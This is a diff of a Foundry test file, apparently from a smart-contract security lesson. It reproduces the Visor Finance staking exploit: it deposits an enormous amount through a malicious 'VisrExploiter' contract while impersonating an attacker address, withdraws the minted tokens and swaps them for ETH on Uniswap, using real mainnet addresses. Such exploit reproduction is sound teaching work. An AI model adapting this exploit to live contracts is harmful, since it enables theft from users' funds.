@@ -6,46 +6,47 @@ import "../src/Lesson 2 - visr.sol";
 import "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 contract visrExploitTest is Test {
-    VisrInterface public visr;
+    VisrInterface public visrContract;
     VisrExploiter public visrExploitContract;
-    UniswapV2Interface public uniswap;
+    UniswapV2Interface public uniswapContract;
     address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
     IERC20 public visrToken;
     IERC20 public vvisrToken;
-    uint256 MAX_INT = 0xfffffffffffffffffffffffffffffff;
+    uint256 MAX_INT_MINTABLE = 0xfffffffffffffffffffffffffffffff;
 
     // setup function runs before tests begin
     function setUp() public {
         // The address of the deployed visrStaking contract
-        visr = VisrInterface(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
-        uniswap = UniswapV2Interface(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
+        visrContract = VisrInterface(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
+        uniswapContract = UniswapV2Interface(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
 
         // set variables
-        visrToken = IERC20(visr.visr());
-        vvisrToken = IERC20(visr.vvisr());
-
+        visrToken = IERC20(visrContract.visr());
+        vvisrToken = IERC20(visrContract.vvisr());
 
         // the malicious contract we want to deploy
         visrExploitContract = new VisrExploiter();
 
+        // we (attacker) will take on address 0x7
         vm.startPrank(address(0x7));
     }
-    
 
     // anything prefixed with test will start with the
-    function testvisr() public {
-        // VM cheat code that sets address to 3
+    function testVisr() public {
+        // Deposit setting the from contract to the malicious hacker contract
         console.log("ETH BALANCE BEFORE HACK: ", address(0x7).balance);
-        visr.deposit(MAX_INT, address(visrExploitContract), address(0x7));
-        visr.withdraw(vvisrToken.balanceOf(address(0x7)), address(0x7), address(0x7));
+        visrContract.deposit(MAX_INT_MINTABLE, address(visrExploitContract), address(0x7));
+        visrContract.withdraw(vvisrToken.balanceOf(address(0x7)), address(0x7), address(0x7));
 
-        
-        address visr_token = address(visr.visr());
+        // Setup path swaps for Uniswap & approve Uniswap to trade our token for ETH
         address[] memory path = new address[](2);
         path[0] = address(visrToken);
         path[1] = weth;
-        visrToken.approve(address(uniswap), visrToken.balanceOf(address(0x7)));
-        uint[] memory amounts = uniswap.swapExactTokensForETH(visrToken.balanceOf(address(0x7)), 0, path, address(0x7), 2650097619);
+        visrToken.approve(address(uniswapContract), visrToken.balanceOf(address(0x7)));
+
+        // Execute Swap
+        uint256[] memory amounts =
+            uniswapContract.swapExactTokensForETH(visrToken.balanceOf(address(0x7)), 0, path, address(0x7), 2650097619);
         console.log("ETH BALANCE AFTER HACK: ", address(0x7).balance);
     }
 }
